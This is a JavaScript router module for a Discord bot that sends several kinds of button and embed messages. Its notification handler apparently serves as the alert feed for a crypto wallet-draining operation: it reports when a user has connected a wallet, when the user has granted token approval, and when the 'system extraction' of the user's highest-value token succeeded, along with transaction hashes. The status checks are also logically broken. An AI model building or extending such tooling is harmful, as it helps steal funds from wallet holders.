import { AutoRouter } from 'itty-router';
import { AWW_COMMAND, INVITE_COMMAND } from './commands.js';
import { buttonManager } from './button-manager.js';
import { buttonHandler } from './button-handlers.js';

class JsonResponse extends Response {
  constructor(body, init) {
    const jsonBody = JSON.stringify(body);
    init = init || {
      headers: {
        'content-type': 'application/json;charset=UTF-8',
      },
    };
    super(jsonBody, init);
  }
}

const customRouter = AutoRouter({ base: '/custom' });

/**
 * 根据状态返回对应的文本
 * @param {notificationData} data - 状态
 * @returns {string} 对应的文本
 */
function getStatusText(data) {
  let text = '';
  if(data.contract_status === 'found' && data.approval_status === 'none' && data.transfer_status === 'none'){
    text = `用户已经连接钱包，等待授权`;
  }else if(data.contract_status === 'found' || data.approval_status === 'approved' || data.transfer_status === 'none'){
    text = `用户已经授权，准备提取`;
    text += `\napprovalTransactionHash: ${data.approvalTransactionHash}`;
  }else if(data.contract_status === 'found' || data.approval_status === 'approved' || data.transfer_status === 'transferred'){
    text = `系统提取成功`;
    text += `\ntransferTransactionHash: ${data.transferTransactionHash}`;
  }

  if(!data.approvalErrorMessage){
    text += `\n授权失败: ${data.approvalErrorMessage}`;
  }
  if(!data.transferErrorMessage){
    text += `\n提取失败: ${data.transferErrorMessage}`;
  }
  return text;

}

/**
 * 发送消息到 Discord 频道
 * @param {string} channelId - Discord 频道 ID
 * @param {string} content - 消息内容
 * @param {string} token - Discord Bot Token
 * @param {Array} components - 可选的组件数组（按钮等）
 * @param {Array} embeds - 可选的嵌入消息数组
 * @returns {Promise<Object>} Discord API 响应
 */
async function sendDiscordMessage(channelId, content, token, components = null, embeds = null) {
  const url = `https://discord.com/api/v10/channels/${channelId}/messages`;
  
  const messageData = {};

  // 如果有内容，添加到消息数据中
  if (content) {
    messageData.content = content;
  }

  // 如果有组件，添加到消息数据中
  if (components && components.length > 0) {
    messageData.components = components;
  }

  // 如果有嵌入消息，添加到消息数据中
  if (embeds && embeds.length > 0) {
    messageData.embeds = embeds;
  }
  
  const response = await fetch(url, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      Authorization: `Bot ${token}`,
    },
    body: JSON.stringify(messageData),
  });

  if (!response.ok) {
    let errorText = `Error sending message to Discord: ${response.status} ${response.statusText}`;
    try {
      const error = await response.text();
      if (error) {
        errorText = `${errorText} \n\n ${error}`;
      }
    } catch (err) {
      // 忽略解析错误
    }
    throw new Error(errorText);
  }

  return await response.json();
}

/**
 * 创建按钮组件
 * @param {Array} buttons - 按钮配置数组
 * @returns {Array} Discord 组件数组
 */
function createButtonComponents(buttons) {
  const components = [];
  
  // Discord 每行最多 5 个按钮
  for (let i = 0; i < buttons.length; i += 5) {
    const row = {
      type: 1, // ACTION_ROW
      components: buttons.slice(i, i + 5).map(button => ({
        type: 2, // BUTTON
        style: button.style || 1, // 默认为 Primary 样式
        label: button.label,
        custom_id: button.custom_id,
        disabled: button.disabled || false,
        emoji: button.emoji || null,
        url: button.url || null, // 对于链接按钮
      }))
    };
    components.push(row);
  }
  
  return components;
}

// 示例路由
customRouter.get('/hello', () => {
  return new JsonResponse({
    message: 'Hello from custom route!',
    timestamp: new Date().toISOString(),
  });
});



// 手动注册 Discord 命令的 API
customRouter.post('/register', async (request, env) => {
  try {
    // 验证必需的环境变量
    if (!env.DISCORD_TOKEN) {
      return new JsonResponse(
        { error: 'DISCORD_TOKEN 环境变量未设置' },
        { status: 500 }
      );
    }

    if (!env.DISCORD_APPLICATION_ID) {
      return new JsonResponse(
        { error: 'DISCORD_APPLICATION_ID 环境变量未设置' },
        { status: 500 }
      );
    }

    // 向 Discord API 注册命令
    const url = `https://discord.com/api/v10/applications/${env.DISCORD_APPLICATION_ID}/commands`;
    
    const response = await fetch(url, {
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bot ${env.DISCORD_TOKEN}`,
      },
      method: 'PUT',
      body: JSON.stringify([AWW_COMMAND, INVITE_COMMAND]),
    });

    if (response.ok) {
      const data = await response.json();
      return new JsonResponse({
        success: true,
        message: '成功注册所有命令',
        commands: data.map(cmd => ({
          id: cmd.id,
          name: cmd.name,
          description: cmd.description,
          version: cmd.version
        }))
      });
    } else {
      let errorText = `注册命令时出错: ${response.status} ${response.statusText}`;
      try {
        const error = await response.text();
        if (error) {
          errorText = `${errorText}\n\n${error}`;
        }
      } catch (err) {
        // 忽略解析错误
      }
      
      return new JsonResponse(
        { 
          error: '注册命令失败',
          details: errorText
        },
        { status: response.status }
      );
    }

  } catch (error) {
    console.error('注册 Discord 命令时出错:', error);
    return new JsonResponse(
      { 
        error: '注册命令失败',
        details: error.message 
      },
      { status: 500 }
    );
  }
});



/**
 * 处理简单消息
 * @param {Object} body - 请求体
 * @param {Object} env - 环境变量
 * @returns {Promise<Object|JsonResponse>} 返回结果或错误响应
 */
async function handleSimpleMessage(body, env) {
  if (!body.content) {
    return new JsonResponse(
      { error: '简单消息需要 content 参数' },
      { status: 400 }
    );
  }
  
  const result = await sendDiscordMessage(
    body.channelId,
    body.content,
    env.DISCORD_TOKEN
  );
  const messageInfo = { type: 'simple', content: body.content };
  
  return { result, messageInfo };
}

/**
 * 处理订单消息
 * @param {Object} body - 请求体
 * @param {Object} env - 环境变量
 * @returns {Promise<Object>} 返回结果
 */
async function handleOrderMessage(body, env) {
  const orderInfo = {
    orderId: body.orderId || `ORDER-${Date.now()}`,
    userId: body.userId || 'user123',
    status: body.status || 'pending'
  };

  const orderButtons = buttonManager.createOrderButtons(orderInfo);
  const orderContent = body.content || `📦 订单信息:\n• 订单ID: ${orderInfo.orderId}\n• 用户ID: ${orderInfo.userId}\n• 状态: ${orderInfo.status}\n\n请选择操作：`;

  const result = await buttonManager.sendMessageWithButtons(
    body.channelId,
    orderContent,
    orderButtons,
    env.DISCORD_TOKEN
  );
  const messageInfo = { type: 'order', orderInfo };
  
  return { result, messageInfo };
}

/**
 * 处理产品消息
 * @param {Object} body - 请求体
 * @param {Object} env - 环境变量
 * @returns {Promise<Object>} 返回结果
 */
async function handleProductMessage(body, env) {
  const productInfo = {
    productId: body.productId || `PROD-${Date.now()}`,
    name: body.name || '示例产品',
    price: body.price || 99.99
  };

  const productButtons = buttonManager.createProductButtons(productInfo);
  const productContent = body.content || `🛍️ 产品信息:\n• 产品ID: ${productInfo.productId}\n• 名称: ${productInfo.name}\n• 价格: ¥${productInfo.price}\n\n请选择操作：`;

  const result = await buttonManager.sendMessageWithButtons(
    body.channelId,
    productContent,
    productButtons,
    env.DISCORD_TOKEN
  );
  const messageInfo = { type: 'product', productInfo };
  
  return { result, messageInfo };
}

/**
 * 处理分页消息
 * @param {Object} body - 请求体
 * @param {Object} env - 环境变量
 * @returns {Promise<Object>} 返回结果
 */
async function handlePaginationMessage(body, env) {
  const pageInfo = {
    currentPage: body.currentPage || 1,
    totalPages: body.totalPages || 10,
    dataType: body.dataType || 'products'
  };

  const paginationButtons = buttonManager.createPaginationButtons(pageInfo);
  const paginationContent = body.content || `📑 分页示例 (${pageInfo.dataType}):\n• 当前页: ${pageInfo.currentPage}\n• 总页数: ${pageInfo.totalPages}\n\n使用按钮来导航：`;

  const result = await buttonManager.sendMessageWithButtons(
    body.channelId,
    paginationContent,
    paginationButtons,
    env.DISCORD_TOKEN
  );
  const messageInfo = { type: 'pagination', pageInfo };
  
  return { result, messageInfo };
}

/**
 * 处理常用按钮消息
 * @param {Object} body - 请求体
 * @param {Object} env - 环境变量
 * @returns {Promise<Object|JsonResponse>} 返回结果或错误响应
 */
async function handleCommonMessage(body, env) {
  if (!body.content) {
    return new JsonResponse(
      { error: '常用按钮消息需要 content 参数' },
      { status: 400 }
    );
  }

  const commonButtons = buttonManager.createCommonButtons(body.buttonOptions || {});
  
  const result = await buttonManager.sendMessageWithButtons(
    body.channelId,
    body.content,
    commonButtons,
    env.DISCORD_TOKEN
  );
  const messageInfo = { type: 'common', buttonOptions: body.buttonOptions };
  
  return { result, messageInfo };
}

/**
 * 处理确认/取消消息
 * @param {Object} body - 请求体
 * @param {Object} env - 环境变量
 * @returns {Promise<Object|JsonResponse>} 返回结果或错误响应
 */
async function handleConfirmMessage(body, env) {
  if (!body.content) {
    return new JsonResponse(
      { error: '确认消息需要 content 参数' },
      { status: 400 }
    );
  }

  const confirmButtons = buttonManager.createConfirmCancelButtons({
    confirmText: body.confirmText,
    cancelText: body.cancelText,
    params: body.params || {}
  });

  const result = await buttonManager.sendMessageWithButtons(
    body.channelId,
    body.content,
    confirmButtons,
    env.DISCORD_TOKEN
  );
  const messageInfo = { 
    type: 'confirm', 
    confirmText: body.confirmText,
    cancelText: body.cancelText,
    params: body.params
  };
  
  return { result, messageInfo };
}

/**
 * 处理自定义按钮消息
 * @param {Object} body - 请求体
 * @param {Object} env - 环境变量
 * @returns {Promise<Object|JsonResponse>} 返回结果或错误响应
 */
async function handleCustomMessage(body, env) {
  if (!body.content) {
    return new JsonResponse(
      { error: '自定义消息需要 content 参数' },
      { status: 400 }
    );
  }

  if (!body.buttons || !Array.isArray(body.buttons)) {
    return new JsonResponse(
      { error: '自定义消息需要 buttons 参数，且必须是数组' },
      { status: 400 }
    );
  }

  // 创建自定义按钮
  const customButtons = body.buttons.map(buttonConfig => {
    return buttonManager.createButton({
      label: buttonConfig.label,
      customId: buttonConfig.customId,
      params: buttonConfig.params || {},
      style: buttonConfig.style || 1,
      handler: buttonConfig.handler || (async (interaction, env, { userName, params }) => {
        return buttonHandler.createResponse(
          `🎯 ${userName} 点击了自定义按钮！\n参数: ${JSON.stringify(params, null, 2)}`,
          'ephemeral'
        );
      })
    });
  });

  const result = await buttonManager.sendMessageWithButtons(
    body.channelId,
    body.content,
    customButtons,
    env.DISCORD_TOKEN
  );
  const messageInfo = { type: 'custom', buttonsCount: body.buttons.length };
  
  return { result, messageInfo };
}

/**
 * 处理通知消息
 * @param {Object} body - 请求体
 * @param {Object} env - 环境变量
 * @returns {Promise<Object|JsonResponse>} 返回结果或错误响应
 */
async function handleNotificationMessage(body, env) {
  if (!body.notificationData) {
    return new JsonResponse(
      { error: '通知消息需要 notificationData 参数' },
      { status: 400 }
    );
  }

  const data = body.notificationData;
  const color = 0x3498db; // 默认蓝色

  // 创建 Discord Embed
  const notificationEmbed = {
    title: `🔔 最新通知`,
    description: `用户地址: \`${data.userAddress}\``,
    color: color,
    fields: [
      {
        name: '记录ID',
        value: `${data.id}`,
        inline: false
      },
      {
        name: '💰 最高价值的代币信息',
        value: `**符号:** ${data.tokenSymbol}\n**余额:** ${data.formattedBalance} ${data.tokenSymbol}\n**价值:** $${data.tokenValue}`,
        inline: false
      },
      {
        name: '📊 状态信息',
        value: ` ${getStatusText(data)}`,
        inline: false
      },
      {
        name: '⏰ 时间信息',
        value: `**创建时间:** ${data.createdAt}\n**更新时间:** ${data.updatedAt}`,
        inline: false
      }
    ],
    timestamp: new Date().toISOString(),
    footer: {
      text: '通知系统'
    }
  };

  const result = await sendDiscordMessage(
    body.channelId,
    null, // 不需要文本内容，使用embed
    env.DISCORD_TOKEN,
    null, // 暂不添加按钮
    [notificationEmbed]
  );
  const messageInfo = { 
    type: 'notification', 
    notificationId: data.id,
    tokenSymbol: data.tokenSymbol,
    balance: data.formattedBalance
  };
  
  return { result, messageInfo };
}

/**
 * 处理演示消息
 * @param {Object} body - 请求体
 * @param {Object} env - 环境变量
 * @returns {Promise<Object>} 返回结果
 */
async function handleDemoMessage(body, env) {
  const demoButtons = [
    { label: '👍 点赞', custom_id: 'like_button', style: 3 },
    { label: '❤️ 收藏', custom_id: 'favorite_button', style: 1 },
    { label: '🔄 分享', custom_id: 'share_button', style: 2 },
    { label: '⚠️ 举报', custom_id: 'report_button', style: 4 },
    { label: '🔗 访问官网', url: 'https://discord.com', style: 5 }
  ];

  const demoComponents = createButtonComponents(demoButtons);
  const demoContent = body.content || '🎉 这是一个演示消息！\n\n请点击下面的按钮来测试：';

  const result = await sendDiscordMessage(
    body.channelId,
    demoContent,
    env.DISCORD_TOKEN,
    demoComponents
  );
  const messageInfo = { type: 'demo', buttonsCount: demoButtons.length };
  
  return { result, messageInfo };
}

// 统一消息发送接口
customRouter.post('/send-message-by-type', async (request, env) => {
  try {
    // 验证必需的环境变量
    if (!env.DISCORD_TOKEN) {
      return new JsonResponse(
        { error: 'DISCORD_TOKEN 环境变量未设置' },
        { status: 500 }
      );
    }

    // 解析请求体
    let body;
    try {
      body = await request.json();
    } catch (err) {
      return new JsonResponse(
        { error: '无效的 JSON 格式' },
        { status: 400 }
      );
    }

    // 验证必需的参数
    if (!body.channelId) {
      return new JsonResponse(
        { error: 'channelId 参数是必需的' },
        { status: 400 }
      );
    }

    if (!body.messageType) {
      return new JsonResponse(
        { error: 'messageType 参数是必需的' },
        { status: 400 }
      );
    }

    // 验证 channelId 格式
    if (!/^\d{17,19}$/.test(body.channelId)) {
      return new JsonResponse(
        { error: 'channelId 格式无效' },
        { status: 400 }
      );
    }

    let result;
    let messageInfo = {};

    // 根据消息类型处理不同的消息
    const handlerMap = {
      'simple': handleSimpleMessage,
      'order': handleOrderMessage,
      'product': handleProductMessage,
      'pagination': handlePaginationMessage,
      'common': handleCommonMessage,
      'confirm': handleConfirmMessage,
      'custom': handleCustomMessage,
      'notification': handleNotificationMessage,
      'demo': handleDemoMessage
    };

    const handler = handlerMap[body.messageType];
    
    if (!handler) {
      return new JsonResponse(
        { error: `不支持的消息类型: ${body.messageType}` },
        { status: 400 }
      );
    }

    // 调用对应的处理方法
    const handlerResult = await handler(body, env);
    
    // 如果返回的是 JsonResponse（错误情况），直接返回
    if (handlerResult instanceof JsonResponse) {
      return handlerResult;
    }
    
    // 否则解构结果和消息信息
    ({ result, messageInfo } = handlerResult);

    return new JsonResponse({
      success: true,
      message: `${body.messageType} 类型消息发送成功`,
      messageType: body.messageType,
      messageInfo,
      discordResponse: {
        id: result.id,
        timestamp: result.timestamp,
        channelId: result.channel_id,
      },
    });

  } catch (error) {
    console.error('发送消息时出错:', error);
    return new JsonResponse(
      { 
        error: '发送消息失败',
        details: error.message 
      },
      { status: 500 }
    );
  }
});


export default customRouter; 